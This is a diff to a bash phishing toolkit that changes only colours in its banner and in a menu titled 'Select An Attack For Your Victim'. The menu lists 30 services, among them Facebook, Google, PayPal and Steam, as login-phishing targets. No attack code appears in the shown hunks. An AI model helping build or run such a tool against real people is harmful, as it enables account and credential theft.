@@ -53,8 +53,8 @@ kill_pid() {
 banner() {
 	cat <<- EOF
 		${ORANGE}
-		${WHITE}
-███████╗██╗███╗░░██╗███████╗  ${RED}░██╗░░░░░░░██╗██╗███╗░░██╗███████╗
+		${RED}
+███████╗██╗███╗░░██╗███████╗  ░██╗░░░░░░░██╗██╗███╗░░██╗███████╗
 ██╔════╝██║████╗░██║██╔════╝  ░██║░░██╗░░██║██║████╗░██║██╔════╝
 █████╗░░██║██╔██╗██║█████╗░░  ░╚██╗████╗██╔╝██║██╔██╗██║█████╗░░
 ██╔══╝░░██║██║╚████║██╔══╝░░  ░░████╔═████║░██║██║╚████║██╔══╝░░
@@ -441,13 +441,13 @@ main_menu() {
 	cat <<- EOF
 		${RED}[${WHITE}::${RED}]${ORANGE} Select An Attack For Your Victim ${RED}[${WHITE}::${RED}]${ORANGE}
 
-		${RED}[${WHITE}01${RED}]${BLUE} Facebook      ${RED}[${WHITE}11${RED}]${PURPLE} Twitch       ${RED}[${WHITE}21${RED}]${BLACK} DeviantArt
-		${RED}[${WHITE}02${RED}]${PINK} Instagram     ${RED}[${WHITE}12${RED}]${RED} Pinterest    ${RED}[${WHITE}22${RED}]${PURPLE} Badoo
+		${RED}[${WHITE}01${RED}]${BLUE} Facebook      ${RED}[${WHITE}11${RED}]${MAGENTA} Twitch       ${RED}[${WHITE}21${RED}]${BLACK} DeviantArt
+		${RED}[${WHITE}02${RED}]${MAGENTA} Instagram     ${RED}[${WHITE}12${RED}]${RED} Pinterest    ${RED}[${WHITE}22${RED}]${MAGENTA} Badoo
 		${RED}[${WHITE}03${RED}]${WHITE} Google        ${RED}[${WHITE}13${RED}]${YELLOW} Snapchat     ${RED}[${WHITE}23${RED}]${ORANGE} Origin
 		${RED}[${WHITE}04${RED}]${WHITE} Microsoft     ${RED}[${WHITE}14${RED}]${BLUE} Linkedin     ${RED}[${WHITE}24${RED}]${BLUE} DropBox	
-		${RED}[${WHITE}05${RED}]${RED} Netflix       ${RED}[${WHITE}15${RED}]${GREEN} Ebay         ${RED}[${WHITE}25${RED}]${PURPLE} Yahoo		
+		${RED}[${WHITE}05${RED}]${RED} Netflix       ${RED}[${WHITE}15${RED}]${GREEN} Ebay         ${RED}[${WHITE}25${RED}]${MAGENTA} Yahoo		
 		${RED}[${WHITE}06${RED}]${CYAN} Paypal        ${RED}[${WHITE}16${RED}]${RED} Quora        ${RED}[${WHITE}26${RED}]${CYAN} Wordpress
-		${RED}[${WHITE}07${RED}]${RED} Steam         ${RED}[${WHITE}17${RED}]${PURPLE} Protonmail   ${RED}[${WHITE}27${RED}]${REDE} Yandex			
+		${RED}[${WHITE}07${RED}]${RED} Steam         ${RED}[${WHITE}17${RED}]${MAGENTA} Protonmail   ${RED}[${WHITE}27${RED}]${REDE} Yandex			
 		${RED}[${WHITE}08${RED}]${CYAN} Twitter       ${RED}[${WHITE}18${RED}]${GREEN} Spotify      ${RED}[${WHITE}28${RED}]${ORANGE} StackoverFlow
 		${RED}[${WHITE}09${RED}]${BLUE} Playstation   ${RED}[${WHITE}19${RED}]${ORANGE} Reddit       ${RED}[${WHITE}29${RED}]${BLUSE} Vk
 		${RED}[${WHITE}10${RED}]${PINK} Tiktok        ${RED}[${WHITE}20${RED}]${RED} Adobe        ${RED}[${WHITE}30${RED}]${GREEN} XBOX
